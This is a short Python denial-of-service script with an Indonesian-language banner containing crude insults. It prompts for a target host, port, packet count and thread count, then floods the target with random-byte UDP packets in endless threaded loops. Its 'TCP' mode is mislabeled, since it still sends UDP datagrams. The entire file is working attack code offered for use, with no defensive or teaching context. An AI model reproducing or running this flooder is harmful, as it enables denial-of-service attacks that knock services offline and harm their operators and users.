#Codes : Rdp sZ
#Mau Rename Dek? 
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[93m

print("------------------------------------------------------------")
print       (" - - > Tools Ddos Biasa < - - ")
print       (" - - > DISCORD : CARI SENDIRI KONTOL <- - ")                                   
print       (" - - > Tools By RisZ Simple < - - ")
print       (" - - > Jangan Abuse Kontol < - - ")
print("------------------------------------------------------------") 

By : RisZ Simple""")

ip = str(input(" Host Or Ip:"))
port = int(input(" Port:"))
choice = str(input(" Ready Attack?(UDP/TCP):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1050)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")
			
def run2():
	data = random._urandom(102498)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")
			
for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
